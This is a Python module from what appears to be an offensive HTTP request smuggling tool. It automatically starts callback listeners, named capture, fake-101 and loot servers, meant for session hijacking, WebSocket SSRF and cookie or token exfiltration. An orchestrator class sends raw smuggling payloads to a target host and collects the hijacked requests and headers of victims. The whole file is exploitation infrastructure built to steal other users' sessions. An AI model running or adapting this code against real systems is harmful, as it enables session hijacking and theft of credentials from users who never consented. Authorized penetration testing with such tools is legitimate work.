"""Automatic Listener Manager for HTTP Smuggler.

Intelligently manages callback listeners based on vulnerability type.
The tool automatically starts the right listener for each attack scenario:

- CL.TE/TE.CL/TE.TE/H2.CL → Capture Server (session hijacking)
- WS.VERSION → Fake 101 Server (WebSocket SSRF)
- CLIENT_SIDE → Loot Server (cookie/token exfiltration)

No manual intervention required - the tool has the brain to do it.
"""

import asyncio
import logging
from typing import Optional, Dict, Any, List, Set
from dataclasses import dataclass, field

from http_smuggler.core.models import SmugglingVariant
from http_smuggler.network.callback_server import (
    CallbackServer,
    AsyncCallbackServer,
    CallbackServerConfig,
    CapturedRequest,
    get_local_ip,
)

logger = logging.getLogger(__name__)


@dataclass
class ListenerConfig:
    """Configuration for automatic listener management."""
    enabled: bool = True
    capture_port: int = 8888
    fake101_port: int = 9999
    loot_port: int = 8080
    wait_timeout: float = 10.0  # How long to wait for callbacks
    bind_host: str = "0.0.0.0"


@dataclass
class ListenerResult:
    """Result from a listener session."""
    listener_type: str
    started: bool
    port: int
    local_ip: str
    captures: List[CapturedRequest] = field(default_factory=list)
    error: Optional[str] = None


# Mapping of variants to their required listener type
VARIANT_LISTENER_MAP: Dict[SmugglingVariant, str] = {
    # Classic smuggling → capture server for session hijacking
    SmugglingVariant.CL_TE: "capture",
    SmugglingVariant.TE_CL: "capture",
    SmugglingVariant.TE_TE: "capture",
    SmugglingVariant.CL_CL: "capture",
    SmugglingVariant.CL_0: "capture",
    SmugglingVariant.ZERO_CL: "capture",

    # HTTP/2 smuggling → capture server
    SmugglingVariant.H2_CL: "capture",
    SmugglingVariant.H2_TE: "capture",
    SmugglingVariant.H2_CRLF: "capture",
    SmugglingVariant.H2_0: "capture",
    SmugglingVariant.H2C: "capture",

    # WebSocket → fake101 server for SSRF
    SmugglingVariant.WS_VERSION: "fake101",
    SmugglingVariant.WS_UPGRADE: "fake101",

    # Client-side → loot server for exfiltration
    SmugglingVariant.CLIENT_SIDE: "loot",

    # Pause-based → capture server
    SmugglingVariant.PAUSE_BASED: "capture",
}


class AutoListenerManager:
    """Intelligent automatic listener management.

    Automatically starts and manages the right listener for each vulnerability type.
    No manual intervention required - the tool figures out what's needed.

    Usage:
        manager = AutoListenerManager()

        # Start listener for a specific variant
        async with manager.listener_for_variant(SmugglingVariant.CL_TE) as listener:
            # Listener is running, do exploitation
            await do_exploitation()
            # Check for captures
            captures = listener.get_captures()

        # Or manually
        manager.start_for_variant(SmugglingVariant.WS_VERSION)
        # ... do stuff ...
        manager.stop_all()
    """

    def __init__(self, config: Optional[ListenerConfig] = None):
        self.config = config or ListenerConfig()
        self._active_servers: Dict[str, CallbackServer] = {}
        self._local_ip = get_local_ip()

    @property
    def local_ip(self) -> str:
        """Get local IP for callbacks."""
        return self._local_ip

    def get_listener_type_for_variant(self, variant: SmugglingVariant) -> Optional[str]:
        """Determine which listener type is needed for a variant."""
        return VARIANT_LISTENER_MAP.get(variant)

    def get_port_for_type(self, listener_type: str) -> int:
        """Get the port for a listener type."""
        if listener_type == "capture":
            return self.config.capture_port
        elif listener_type == "fake101":
            return self.config.fake101_port
        elif listener_type == "loot":
            return self.config.loot_port
        return 8888

    def start_for_variant(self, variant: SmugglingVariant) -> ListenerResult:
        """Start the appropriate listener for a smuggling variant.

        Args:
            variant: The smuggling variant being exploited

        Returns:
            ListenerResult with server info and status
        """
        if not self.config.enabled:
            return ListenerResult(
                listener_type="none",
                started=False,
                port=0,
                local_ip=self._local_ip,
                error="Auto-listeners disabled",
            )

        listener_type = self.get_listener_type_for_variant(variant)
        if not listener_type:
            return ListenerResult(
                listener_type="unknown",
                started=False,
                port=0,
                local_ip=self._local_ip,
                error=f"No listener type defined for {variant.value}",
            )

        return self.start_listener(listener_type)

    def start_listener(self, listener_type: str) -> ListenerResult:
        """Start a specific listener type.

        Args:
            listener_type: One of 'capture', 'fake101', 'loot'

        Returns:
            ListenerResult with server info
        """
        # Check if already running
        if listener_type in self._active_servers:
            server = self._active_servers[listener_type]
            if server.is_running:
                return ListenerResult(
                    listener_type=listener_type,
                    started=True,
                    port=self.get_port_for_type(listener_type),
                    local_ip=self._local_ip,
                )

        port = self.get_port_for_type(listener_type)

        config = CallbackServerConfig(
            host=self.config.bind_host,
            port=port,
            timeout=self.config.wait_timeout,
        )

        server = CallbackServer(config)

        try:
            if listener_type == "capture":
                success = server.start_capture_server()
            elif listener_type == "fake101":
                success = server.start_fake101_server()
            elif listener_type == "loot":
                success = server.start_loot_server()
            else:
                return ListenerResult(
                    listener_type=listener_type,
                    started=False,
                    port=port,
                    local_ip=self._local_ip,
                    error=f"Unknown listener type: {listener_type}",
                )

            if success:
                self._active_servers[listener_type] = server
                logger.info(
                    f"Auto-started {listener_type} listener on "
                    f"{self._local_ip}:{port}"
                )
                return ListenerResult(
                    listener_type=listener_type,
                    started=True,
                    port=port,
                    local_ip=self._local_ip,
                )
            else:
                return ListenerResult(
                    listener_type=listener_type,
                    started=False,
                    port=port,
                    local_ip=self._local_ip,
                    error="Failed to start server (port may be in use)",
                )

        except Exception as e:
            return ListenerResult(
                listener_type=listener_type,
                started=False,
                port=port,
                local_ip=self._local_ip,
                error=str(e),
            )

    def stop_listener(self, listener_type: str):
        """Stop a specific listener."""
        if listener_type in self._active_servers:
            server = self._active_servers[listener_type]
            server.stop()
            del self._active_servers[listener_type]
            logger.info(f"Stopped {listener_type} listener")

    def stop_all(self):
        """Stop all active listeners."""
        for listener_type in list(self._active_servers.keys()):
            self.stop_listener(listener_type)

    def get_captures(self, listener_type: str = "capture") -> List[CapturedRequest]:
        """Get captured requests from a listener."""
        if listener_type in self._active_servers:
            return self._active_servers[listener_type].get_captures()
        return []

    def wait_for_captures(
        self,
        listener_type: str = "capture",
        timeout: Optional[float] = None,
        min_captures: int = 1,
    ) -> List[CapturedRequest]:
        """Wait for captures from a listener."""
        if listener_type not in self._active_servers:
            return []

        timeout = timeout or self.config.wait_timeout
        return self._active_servers[listener_type].wait_for_captures(
            timeout=timeout,
            min_captures=min_captures,
        )

    def get_callback_url(self, listener_type: str = "capture", path: str = "/") -> str:
        """Get the callback URL for a listener."""
        port = self.get_port_for_type(listener_type)
        return f"http://{self._local_ip}:{port}{path}"

    def is_running(self, listener_type: str) -> bool:
        """Check if a listener is running."""
        if listener_type in self._active_servers:
            return self._active_servers[listener_type].is_running
        return False

    @property
    def active_listeners(self) -> Set[str]:
        """Get set of active listener types."""
        return {k for k, v in self._active_servers.items() if v.is_running}

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop_all()


class SmartExploitOrchestrator:
    """High-level orchestrator for smart exploitation with auto-listeners.

    This is the "brain" that decides:
    1. What type of attack is possible
    2. Which listener to start
    3. How to craft the exploitation payload
    4. How to verify success

    Usage:
        orchestrator = SmartExploitOrchestrator()
        result = await orchestrator.exploit(
            detection_result,
            payload,
            host, port, use_ssl
        )
    """

    def __init__(self, listener_config: Optional[ListenerConfig] = None):
        self.listener_manager = AutoListenerManager(listener_config)

    async def exploit(
        self,
        variant: SmugglingVariant,
        payload_bytes: bytes,
        host: str,
        port: int,
        use_ssl: bool,
        wait_for_victim: bool = True,
    ) -> Dict[str, Any]:
        """Automatically exploit a vulnerability with the right listener.

        Args:
            variant: Detected smuggling variant
            payload_bytes: Raw payload bytes
            host: Target host
            port: Target port
            use_ssl: Use SSL/TLS
            wait_for_victim: Whether to wait for a victim request

        Returns:
            Dict with exploitation results
        """
        result = {
            "success": False,
            "listener_started": False,
            "listener_type": None,
            "callback_url": None,
            "captures": [],
            "steps": [],
            "error": None,
        }

        # Start appropriate listener
        listener_result = self.listener_manager.start_for_variant(variant)

        if listener_result.started:
            result["listener_started"] = True
            result["listener_type"] = listener_result.listener_type
            result["callback_url"] = self.listener_manager.get_callback_url(
                listener_result.listener_type
            )
            result["steps"].append({
                "action": "start_listener",
                "type": listener_result.listener_type,
                "url": result["callback_url"],
            })
        else:
            result["error"] = listener_result.error
            return result

        try:
            # Import here to avoid circular dependency
            from http_smuggler.network.raw_socket import AsyncRawHttpClient
            from http_smuggler.core.config import NetworkConfig

            async with AsyncRawHttpClient(NetworkConfig()) as client:
                await client.connect(host, port, use_ssl)

                # Send the exploitation payload
                response = await client.send_and_receive(
                    payload_bytes,
                    receive_timeout=10.0,
                )

                result["steps"].append({
                    "action": "send_payload",
                    "status": response.status_code if response else None,
                })

                # Wait for victim (if applicable)
                if wait_for_victim and listener_result.listener_type == "capture":
                    await asyncio.sleep(2)  # Give time for victim traffic

                    # Check for captures
                    captures = self.listener_manager.wait_for_captures(
                        listener_type="capture",
                        timeout=self.listener_manager.config.wait_timeout,
                        min_captures=1,
                    )

                    if captures:
                        result["captures"] = [
                            {
                                "method": c.method,
                                "path": c.path,
                                "headers": c.headers,
                                "source": f"{c.source_ip}:{c.source_port}",
                            }
                            for c in captures
                        ]
                        result["success"] = True
                        result["steps"].append({
                            "action": "capture_received",
                            "count": len(captures),
                        })

        except Exception as e:
            result["error"] = str(e)
            result["steps"].append({
                "action": "error",
                "message": str(e),
            })

        finally:
            # Don't stop listener immediately - user might want to keep it running
            pass

        return result

    def cleanup(self):
        """Clean up all listeners."""
        self.listener_manager.stop_all()
